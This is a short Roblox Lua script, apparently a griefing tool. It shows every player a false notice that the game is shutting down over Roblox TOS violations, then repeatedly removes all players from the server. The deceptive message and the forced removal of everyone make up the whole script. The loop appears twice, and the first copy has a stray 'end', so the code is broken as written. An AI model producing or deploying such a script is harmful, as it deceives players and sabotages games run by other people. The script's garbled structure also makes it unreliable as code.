local hint = Instance.new("Hint", workspace)
hint.Text = "This game is shutting down due to multiple Roblox TOS Violations."
while true do 
 wait(0.1)
 Hi = game.Players:GetChildren()
 for i = 1,#Hi do
  Hi[i].Locked = false
  Hi[i]:Remove()
  end
 end
end

while true do
 wait(0.1)
  lol = game.Players:GetChildren()
  for i =1,#lol do
  lol[i].Locked = false
  lol[i]:Remove()
 end
end
